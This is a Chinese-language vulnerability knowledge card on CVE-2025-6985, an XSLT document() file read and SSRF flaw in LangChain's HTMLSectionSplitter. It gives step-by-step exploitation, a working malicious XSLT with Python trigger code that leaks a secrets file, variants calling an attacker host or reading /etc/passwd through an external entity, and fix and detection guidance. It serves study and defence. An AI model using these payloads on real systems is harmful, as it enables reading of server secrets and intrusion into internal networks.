---
id: web-generic-xxe-langchain-htmlsectionsplitter-xslt-document-file-read
title: LangChain HTMLSectionSplitter 的 xslt_path 可控导致 XSLT document() XXE 任意文件读取（CVE-2025-6985）
type: scenario
domain: web
path: web/generic/xxe
technique: xslt-document-xxe-file-read
tags:
- xxe
- xslt
- lxml
- libxslt
- langchain
- langchain-text-splitters
- python
- file-read
- ssrf
- ai
cve:
- CVE-2025-6985
severity: high
confidence: high
status: verified
affected_versions: langchain-text-splitters < 0.3.9（原文靶场 0.3.8；lxml 4.9.4；0.3.9 移除 xslt_path 并加固解析器）
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V178
  verified_at: '2026-11-06T11:40:40+08:00'
  notes: 已对照原文与唯一截图核对：CVE-2025-6985、<0.3.9、HTMLSectionSplitter xslt_path→etree.parse+XSLT 无 access_control、document('file://...')回显、0.3.9 修复项均一致；截图证实读取 /app/secret_config.xml 得到 SECRET_PASS/AKIA。卡片正确区分了 XML 配置文件可回显与 /etc/passwd 纯文本的不确定性，未把未验证的 SSRF 变体当作已验证。未验证点：未在本机复跑。
url: /docs/web/generic/xxe/web-generic-xxe-langchain-htmlsectionsplitter-xslt-document-file-read/
draft: false
kb_aliases:
- CVE-2025-6985
- LangChain XXE
- langchain-text-splitters XXE
- HTMLSectionSplitter XXE
- xslt_path XXE
- XSLT document() 文件读取
- lxml XSLT 任意文件读取
---

## 一句话结论

当应用把攻击者可控的 XSLT 文件路径传给 `langchain-text-splitters` 的 `HTMLSectionSplitter(xslt_path=...)` 时，组件会用默认配置的 lxml 解析并执行该 XSLT；攻击者在样式表里用 `document('file:///...')` 即可把服务器本地文件读入转换结果，并随 `split_text()` 的返回值回显，形成有回显的任意文件读取（CVE-2025-6985，< 0.3.9）。

## 原理

- `HTMLSectionSplitter.__init__` 接受外部传入的 `xslt_path`，只做 `pathlib.Path(xslt_path).absolute()` 后保存，不校验文件来源与内容。
- `split_text()` 调用 `convert_possible_tags_to_header()`：先用 `etree.HTMLParser()` 解析待分块 HTML，再执行 `etree.parse(self.xslt_path)` 解析调用方指定的 XSLT，最后 `etree.XSLT(xslt_tree)(tree)` 执行转换。
- 关键在 `etree.XSLT()` 没有传入 `access_control`。lxml 的 XSLT 默认访问控制允许读写本地文件和访问网络；libxslt 在转换阶段遇到 XSLT 1.0 的 `document()` 函数时会按其 URI 参数加载外部资源，`file://` 指向本地文件，`http://` 指向远程地址。
- `document()` 返回的节点集被 `xsl:copy-of` 序列化进转换结果，`convert_possible_tags_to_header()` 再 `str(result)` 返回，文件内容因此进入分块文本，攻击者无需 OOB 通道即可直接读取。
- 同一个 XSLT 解析走默认 `etree.parse()`，未设置 `load_dtd=False`、`resolve_entities=False`、`no_network=True`；因此恶意 XSLT 还可夹带外部实体/外部 DTD，作为第二条读取或 SSRF 通道（在 lxml 4.x 默认允许外部实体的环境下）。
- 修复版本 0.3.9 移除了 `xslt_path` 参数，并对解析器与 XSLT 转换补上 `no_network=True`、`resolve_entities=False`、`load_dtd=False` 和 `XSLTAccessControl.DENY_ALL`。移除参数切断了“攻击者提供样式表”这一主入口，访问控制则阻断默认样式表被二次利用时的文件/网络访问。

## 触发条件

- 使用 `langchain-text-splitters < 0.3.9`，且安装了 lxml/libxslt。
- 业务把用户可控的 XSLT 文件路径或上传文件传给 `HTMLSectionSplitter(xslt_path=...)`，例如多租户文档转换、可配置模板/样式表、把上传目录中的文件路径直接当配置项。
- 进程对目标文件有读权限；`split_text()` 的结果会返回给攻击者或写入其可读的位置（日志、预览、分块结果、检索库）。
- 仅由服务端固定提供可信 XSLT、且不接受外部路径/文件时，不构成该场景。

## 利用步骤

1. 确认目标使用 `langchain-text-splitters < 0.3.9`，并存在可影响 `xslt_path` 的入口（上传 XSLT、填写路径、模板市场、租户自定义转换规则等）。
2. 构造恶意 XSLT，在模板中用 `document('file:///目标路径')` 加载目标文件，并用 `xsl:copy-of` 输出。
3. 让目标以该 XSLT 初始化 `HTMLSectionSplitter` 并调用 `split_text()` 处理任意 HTML。
4. 从返回的分块文本中读取文件内容；对 XML 配置/密钥文件可直接得到明文。
5. 需要探测内网时，把 `file://` 换成 `http://内网地址/`，用响应时间或转换结果判断可达性（SSRF）；无回显场景可改用外部实体 + OOB 外带。

## PoC

恶意 XSLT（读取 XML 配置；`/app/secret_config.xml` 为演示路径）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html><body><h1>leak</h1>
      <pre><xsl:copy-of select="document('file:///app/secret_config.xml')"/></pre>
    </body></html>
  </xsl:template>
</xsl:stylesheet>
```

触发代码：

```python
from langchain_text_splitters import HTMLSectionSplitter

splitter = HTMLSectionSplitter(
    [("h1", "H")],
    xslt_path="/tmp/evil.xslt",   # 攻击者可控的样式表
)
chunks = splitter.split_text("<html><body><h1>demo</h1></body></html>")
print("\n".join(chunks))
# 预期：输出中出现 secret_config.xml 的数据库密码 / API key 等节点文本
```

注意：`document()` 由 libxslt 按 XML 文档加载目标，XML 形式的配置文件、密钥文件、部分日志最稳定；纯文本文件（如 `/etc/passwd`）是否回显取决于 libxslt/libxml2 版本与解析选项，可能解析失败或只返回空节点集，遇到时改用目标机器上的 XML 配置并在本地验证。无 PoC 的远程 URL SSRF 变体未在原文验证。

## 变体与关联

- 变体：`document('http://attacker/evil.dtd')` 或 `document('http://内网IP:port/')` 把 XSLT 变成 SSRF/内网探测原语；默认访问控制允许网络读。
- 变体：在恶意 XSLT 顶部加入 `<!DOCTYPE xsl:stylesheet [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>`，把实体值写进 `xsl:text`，走 XML 解析器外部实体通道；lxml 4.x 默认会展开。
- 变体：若业务只允许上传、不直接回显分块结果，可把读到的内容写入索引/向量库/日志，再从检索或日志侧读取。
- 关联：[[web-generic-xxe-inband-file-read-default-insecure]]（通用 XML 解析器有回显文件读取）、[[web-generic-xxe-oob-exfil]]（无回显时 OOB 外带）、[[web-generic-xxe-reflected-xml-ssrf-internal-service]]（外部实体驱动 SSRF）。
- 边界：升级到 `langchain-text-splitters >= 0.3.9` 后 `xslt_path` 被移除，本入口消失；仅在应用自行保留旧版或等价的自定义 XSLT 处理逻辑时仍需防护。

## 检测与防御

- 修复：升级到 `langchain-text-splitters >= 0.3.9`，不要再向 `HTMLSectionSplitter` 传入外部可控的 `xslt_path`；需要自定义转换时，把 XSLT 作为服务端内置资源随应用发布，按白名单加载。
- 加固：直接调用 lxml 时设置 `etree.XMLParser(load_dtd=False, resolve_entities=False, no_network=True)`，并用 `etree.XSLT(xslt_tree, access_control=etree.XSLTAccessControl.DENY_ALL)` 禁止转换期文件/网络 I/O；只对可信样式表开放必要权限。
- 检测：关注 XSLT 中的 `document(`、`file://`、`http://`、`xsl:include`、`xsl:import`；应用进程异常读取配置/密钥路径；XSLT 转换阶段出现外部 URI 请求或 libxslt 加载失败告警。
- 隔离：把文档转换放到低权限容器/沙箱，限制可读目录与出网；不要以 root 或挂载密钥的方式运行拆分服务。
